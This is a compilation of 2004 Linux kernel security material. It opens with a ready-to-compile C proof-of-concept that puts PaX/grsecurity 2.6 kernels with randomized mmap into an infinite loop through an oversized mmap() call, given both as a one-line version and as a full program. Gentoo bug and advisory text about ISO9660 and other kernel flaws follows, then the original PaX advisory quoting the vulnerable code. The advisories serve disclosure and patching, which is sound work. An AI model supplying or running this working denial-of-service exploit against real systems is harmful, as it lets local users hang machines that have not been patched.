/*
  PaX w/ CONFIG_PAX_RANDMMAP for Linux 2.6.x DoS proof-of-concept
  by Shadowinteger <shadowinteger@sentinix.org>
  2004-05-04

  Written after reading the security advisory posted by borg (ChrisR-) on
  Bugtraq 2004-05-03 (my time). ChrisR -> [www.cr-secure.net](http://www.cr-secure.net)

  Acknowledgments: sabu ([www.sabu.net](http://www.sabu.net))

  Vulnerability:
    PaX code for 2.6.x prior to 2004-05-01 in arch_get_unmapped_area()
    (function in mm/mmap.c) is vulnerable to a local Denial of Service attack
    because of a bug that puts the kernel into an infinite loop.

    Read the security advisory for more info:
    <http://www.securityfocus.com/archive/1/361968/2004-04-30/2004-05-06/0>

  Exploitation:
    We need to get passed the following line of code in
    arch_get_unmapped_area() to succeed with a DoS:
        if (TASK_SIZE - len < addr) { ...

    We do it like this:

    TASK_SIZE - TYPICAL_ADDR + SINK = DOSVAL

    DOSVAL is the value we'll use.

    arch_get_unmapped_area() does the following:

    if TASK_SIZE-DOSVAL < TYPICAL_ADDR then... run right into the vuln code.
    (TASK_SIZE-DOSVAL) *must* be less than TYPICAL_ADDR to succeed.

    A DOSVAL of e.g. 0x80000000 or above will work most times, no real need
    for the funky calculation above.

    There are quite a few functions available that are "front-ends" to
    arch_get_unmapped_area(). This exploit uses good-old mmap().

  Tiny DoS PoC:

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
int main(void){int fd=open("/dev/zero",O_RDONLY);mmap(0,0xa0000000,PROT_READ,MAP_PRIVATE,fd,0);}

*/

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdio.h>

#define TASK_SIZE 0xc0000000
#define TYPICAL_ADDR 0x43882000
#define SINK 0x04000000

#define DOSVAL (TASK_SIZE - TYPICAL_ADDR + SINK)

int main() {
    int fd = open("/dev/zero", O_RDONLY);

    printf("PaX w/ CONFIG_PAX_RANDMMAP for Linux 2.6.x DoS proof-of-concept\n"
           "by Shadowinteger <shadowinteger@sentinix.org> 20040504\n"

	   "will exec \"mmap(0, 0x%x, PROT_READ, MAP_PRIVATE, fd, 0);\"\n"

           "if you run Linux 2.6.x-PaX or -grsec, this may \"hurt\" your CPU(s) a little,\n"
	   "are you sure you want to continue? [type Y to continue] ", DOSVAL);
    fflush(stdout);

    if (getchar() != 'Y') {
	printf("aborted.\n");
	return 0;
    }

    printf("\n"
           "attempting to DoS...\n");

    if (mmap(0, DOSVAL, PROT_READ, MAP_PRIVATE, fd, 0) == MAP_FAILED) {
	perror("mmap");
    }

    printf("your kernel does not seem to be vulnerable! :)\n");

    return 0;
}

| [Description](#c0)  gen2daniel    2004-04-14 21:57:46 UTC  ``` The Linux kernel performs no length checking on symbolic links stored on an ISO9660 file system, allowing a malformed CD to perform an arbitrary length overflow in kernel memory.  Symbolic links on ISO9660 file systems are supported by the 'Rock Ridge' extension to the standard format. The vulnerability can be triggered by performing a directory listing on a maliciously constructed ISO file system, or attempting to access a file via a malformed symlink on such a file system. Many distributions allow local users to mount CDs, which makes them potentially vulnerable to local elevation attacks.  The relevant functions are as follows:  fs/isofs/rock.c: rock_ridge_symlink_readpage() fs/isofs/rock.c: get_symlink_chunk()  There is no checking that the total length of the symlink being read is less than the memory space that has been allocated for storing it. By supplying many CE (continuation) records, each with another SL (symlink) chunk, it is possible for an attacker to build an arbitrary length data structure in kernel memory space.  A proof of concept exploit has been written that allows a local user to gain root level access. It is also possible to cause execution of code with kernel privileges.  III. ANALYSIS  In order to exploit this vulnerability, an attacker must be able to mount a maliciously constructed file system. This may be accomplished by the following:  a. Having an account on the machine to be compromised and inserting a malformed disk. Some distributions allow local users to mount removable media without needing to be root and with some configurations. This happens automatically when a disk is inserted. The proof of concept exploit works from floppy disk as well as CD-ROM.  If the attacker can reboot the machine from his or her own media or supply command line options to the kernel during the initialization process after rebooting, exploiting this vulnerability may not be necessary to gain further access. In this situation, the attacker will not be able to directly access any encrypted file systems.  b. If encrypted virtual file systems are implemented, and the attacker gains access to an account able to mount one, then an attacker may be able to mount his or her own maliciously formed file system via the encryption interface. This would allow them access to any already mounted file systems.  c. Being root already. If the attacker has already gained root, but the kernel has some form of patch preventing root being able to perform certain functions, he or she may still be able to mount a file system. As the vulnerability occurs in kernel space, it may be possible for them to neutralize the restrictions.  IV. DETECTION  The issue affects the 2.4.x, 2.5.x and 2.6.x kernel. Other kernel implementations may also be vulnerable.  V. WORKAROUNDS  Disable user mounting of removable media devices.  Reproducible: Always Steps to Reproduce: 1. 2. 3. ```  [Comment 1](#c1)  Tim Yamin (RETIRED)   gentoo-dev  2004-04-14 22:52:18 UTC  ``` Thanks; fixed kernels will be added here as they are done. ```  [Comment 2](#c2)  Tim Yamin (RETIRED)   gentoo-dev  2004-04-14 23:19:41 UTC  ``` Vanilla-sources-2.4.26 is in... ```  [Comment 3](#c3)  Tim Yamin (RETIRED)   gentoo-dev  2004-04-14 23:45:27 UTC  ``` Vanilla-sources-2.4.26 is in... ```  [Comment 4](#c4)  Tim Yamin (RETIRED)   gentoo-dev  2004-04-14 23:45:52 UTC  ``` SELinux-sources-2.4.25 is in... ```  [Comment 5](#c5)  solar (RETIRED)   gentoo-dev  2004-04-15 00:02:48 UTC  ``` As long as no bug reports show up for grsec at grsec site and spender  moves his patches out of <http://grsecurity.net/~spender/> and to the main site.

### Background

The Linux kernel is responsible for managing the core aspects of a
GNU/Linux system, providing an interface for core system applications
as well as providing the essential structure and capability to access
hardware that is needed for a running system.

### Description

Multiple flaws have been discovered in the Linux kernel. This advisory
corrects the following issues:

* CAN-2004-0109: This vulnerability allows privilege escalation using
  ISO9660 file systems through a buffer overflow via a malformed file
  system containing a long symbolic link entry. This can allow arbitrary
  code execution at kernel level.
* CAN-2004-0133: The XFS file system in 2.4 series kernels has an
  information leak by which data in the memory can be written to the
  device hosting the file system, allowing users to obtain portions of
  kernel memory by reading the raw block device.
* CAN-2004-0177: The ext3 file system in 2.4 series kernels does not
  properly initialize journal descriptor blocks, causing an information
  leak by which data in the memory can be written to the device hosting
  the file system, allowing users to obtain portions of kernel memory by
  reading the raw device.
* CAN-2004-0181: The JFS file system in 2.4 series kernels has an
  information leak by which data in the memory can be written to the
  device hosting the file system, allowing users to obtain portions of
  kernel memory by reading the raw device.
* CAN-2004-0178: The OSS Sound Blaster [R] Driver has a Denial of Service
  vulnerability since it does not handle certain sample sizes properly.
  This allows local users to hang the kernel.
* CAN-2004-0228: Due to an integer signedness error in the CPUFreq /proc
  handler code in 2.6 series Linux kernels, local users can escalate
  their privileges.
* CAN-2004-0229: The framebuffer driver in 2.6 series kernel drivers does
  not use the fb\_copy\_cmap method of copying structures. The impact of
  this issue is unknown, however.
* CAN-2004-0394: A buffer overflow in the panic() function of 2.4 series
  Linux kernels exists, but it may not be exploitable under normal
  circumstances due to its functionality.
* CAN-2004-0427: The do\_fork() function in both 2.4 and 2.6 series Linux
  kernels does not properly decrement the mm\_count counter when an error
  occurs, triggering a memory leak that allows local users to cause a
  Denial of Service by exhausting other applications of memory; causing
  the kernel to panic or to kill services.
* CAN-2004-0495: Multiple vulnerabilities found by the Sparse source
  checker in the kernel allow local users to escalate their privileges or
  gain access to kernel memory.
* CAN-2004-0535: The e1000 NIC driver does not properly initialize memory
  structures before using them, allowing users to read kernel memory.
* CAN-2004-0554: 2.4 and 2.6 series kernels running on an x86 or an AMD64
  architecture allow local users to cause a Denial of Service by a total
  system hang, due to an infinite loop that triggers a signal handler
  with a certain sequence of fsave and frstor instructions.
* Local DoS in PaX: If ASLR is enabled as a GRSecurity PaX feature, a
  Denial of Service can be achieved by putting the kernel into an
  infinite loop. Only 2.6 series GRSecurity kernels are affected by this
  issue.
* RSBAC 1.2.3 JAIL issues: A flaw in the RSBAC JAIL implementation allows
  suid/sgid files to be created inside the jail since the relevant module
  does not check the corresponding mode values. This can allow privilege
  escalation inside the jail. Only rsbac-(dev-)sources are affected by
  this issue.

### Impact

Arbitrary code with normal non-super-user privileges may be able to
exploit any of these vulnerabilities; gaining kernel level access to
memory structures and hardware devices. This may be used for further
exploitation of the system, to leak sensitive data or to cause a Denial
of Service on the affected kernel.

### Workaround

Although users may not be affected by certain vulnerabilities, all
kernels are affected by the CAN-2004-0394, CAN-2004-0427 and
CAN-2004-0554 issues which have no workaround. As a result, all users
are urged to upgrade their kernels to patched versions.

### Resolution

Users are encouraged to upgrade to the latest available sources for
their system:

```
 # emerge sync
 # emerge -pv your-favorite-sources
 # emerge your-favorite-sources

 # # Follow usual procedure for compiling and installing a kernel.
 # # If you use genkernel, run genkernel as you would do normally.
```

<http://www.cr-secure.net>
Found by: borg (ChrisR-)

A small bug in PaX was found.

What is PaX?
-----------------------

PaX is a collection of intrusion prevention patches for the Linux Kernel
2.2, 2.4, and 2.6.
This advisory only affects the PaX patches for the 2.6 linux kernel.
PaX is located at <http://pax.grsecurity.net>

Impact?
------------------

Denial of service through putting the kernel into an infinite loop when
ASLR is enabled.

Vulnerable PaX code?
-----------------------
(sorry for white space)
====================================================
'linux/mm/mmap.c'

 if (start_addr != TASK_UNMAPPED_BASE) {

#ifdef CONFIG_PAX_RANDMMAP
                                if (current->flags & PF_PAX_RANDMMAP)
                                        start_addr = addr =
TASK_UNMAPPED_BASE + mm->delta_mmap;
                                else
#endif
                                                                                      \

                                start_addr = addr = TASK_UNMAPPED_BASE;
                                goto full_search;
                        }
                        return -ENOMEM;

====================================================
And the correct code,

grab the patch at
<http://pax.grsecurity.net/pax-linux-2.6.5-200405011700.patch>

=====================================================

Exploit Code?
-----------------------

Im not releasing my exploit code for this just yet. Pherhaps I never will.
But its very simple code, simple enough to do in 2 lines. Your not getting
anymore proof of concept code from me on any advisories.

Fix?
-----------------------

PaX team is aware of the problem and has already released a fix for this
on the PaX homepage.

Thanks and greets:
Mattjf, TLharris, Shrike, think, and efnet #cryptography
